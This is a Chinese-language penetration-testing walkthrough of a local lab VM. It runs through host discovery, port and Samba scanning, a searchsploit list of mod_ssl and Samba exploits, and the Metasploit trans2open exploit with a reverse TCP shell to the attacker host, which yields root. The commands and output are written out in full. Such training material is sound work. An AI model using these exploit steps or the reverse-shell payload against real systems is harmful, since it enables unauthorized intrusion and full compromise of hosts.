下载虚拟机，用VMWare打开，和Kali攻击机在一个网段

### 信息收集
#### ip探测
虚拟机安装好后，不能通过登录机器获取ifconfig的ip信息，所以使用外部扫描确定机器在网段中的ip，使用kali的arp-scan或者nmap

```
$ arp-scan 192.168.159.0/24
...
192.168.159.129 00:0c:29:e4:26:1c VMware, Inc.
...

$ nmap -sn 192.168.159.0/24
...
Nmap scan report for 192.168.159.129
...
```

得到机器的ip是192.168.159.129

#### 服务探测
使用nmap进行全端口扫描，直接使用msf中的db_nmap可以保存数据更加方便

```
msf $ db_nmap -sT -sV -p 1-65535 -Pn 192.168.159.129
msf $ services 192.168.159.129
host             port  proto  name         state  info
----             ----  -----  ----         -----  ----
192.168.159.129  22    tcp    ssh          open   OpenSSH 2.9p2 protocol 1.99
192.168.159.129  80    tcp    http         open   Apache httpd 1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
192.168.159.129  111   tcp    rpcbind      open   2 RPC #100000
192.168.159.129  139   tcp    netbios-ssn  open   Samba smbd workgroup: MYGROUP
192.168.159.129  443   tcp    ssl/https    open   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
192.168.159.129  1024  tcp    status       open   1 RPC #100024
```

#### samba版本探测
nbtscan可以探测139端口的信息，enum4linux工具可以枚举samba的信息，比如是否可以用空口令session

还是用msf进行samba版本探测

```
msf5 > search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   1  auxiliary/scanner/smb/smb_version                   normal  Yes    SMB Version Detection


msf5 > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.159.129
RHOSTS => 192.168.159.129
msf5 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.159.129:139   - Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.159.129:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### web目录暴破
```
$ dirb http://192.168.159.129
```

暴破出来一些路径，访问均没有发现明显的利用点

### 威胁建模
主机资产：Linux 2.4.x ip 192.168.159.129
服务资产：http、httpd、rpcbind、ssh、samba
web框架、插件未查

考虑可能产生漏洞的攻击面

1. web漏洞，期望通过SQL或者命令执行或者apache httpd本身漏洞等高风险漏洞拿到权限
2. samba有远程RCE或者远程提权漏洞，或者可以获取一些信息
3. SSL的漏洞，有远程RCE或者远程提权漏洞
4. ssh口令暴破
5. rpc可能有一些反序列化漏洞

### 漏洞分析
AWVS扫描Web没有发现Web漏洞

```
$ searchsploit samba 2.2
$ searchsploit httpd 1.3
$ searchsploit ssl 2.8
$ searchsploit ssl 2.9
$ searchsploit ssl 0.9
$ searchsploit apache 1.3
$ searchsploit rpc
```

得出一些可能比较有用的漏洞，去掉非Linxu平台，去掉一些没有EXP的漏洞，得到比较可用的一些EXP，去掉心脏出血这种不够直接的EXP
```
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                         | exploits/unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow                                       | exploits/unix/remote/764.c
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                      | exploits/linux/remote/16321.rb
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                          | exploits/linux_x86/remote/16861.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution                                                    | exploits/linux/remote/55.c
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                         | exploits/linux/remote/9936.rb
Samba 2.2.x - Remote Buffer Overflow                                                                         | exploits/linux/remote/7.pl
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                            | exploits/multiple/remote/10.c
```

### 漏洞攻击
有metasploit标志的先进行尝试
```
msf5 exploit(linux/samba/trans2open) > use exploit/linux/samba/trans2open
msf5 exploit(linux/samba/trans2open) > set RHOSTS 192.168.159.129
RHOSTS => 192.168.159.129
msf5 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf5 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.159.129  yes       The target address range or CIDR identifier
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.159.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


msf5 exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] 192.168.159.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.159.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.159.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.159.129:139 - Trying return address 0xbffffafc...
[*] Command shell session 10 opened (192.168.159.128:4444 -> 192.168.159.129:1074) at 2019-09-24 16:42:28 +0800

whoami
root
```

直接提权到root了

### 后渗透攻击
pass

切换到root目录，查看`.bash_history`文件可以看到执行过mail命令

执行后查看邮件，可以得到一份祝贺邮件

### 其他
使用mod_ssl的764.c编译失败，这种情况可以到exploit-db上找到对应CVE编号，查询是否有编译好的或者看源c文件，是否有提示，编译中版本问题libssl的库在kali上无法安装，可以使用其他github或者exploit-db上已有的EXP，不行就换其他的漏洞试
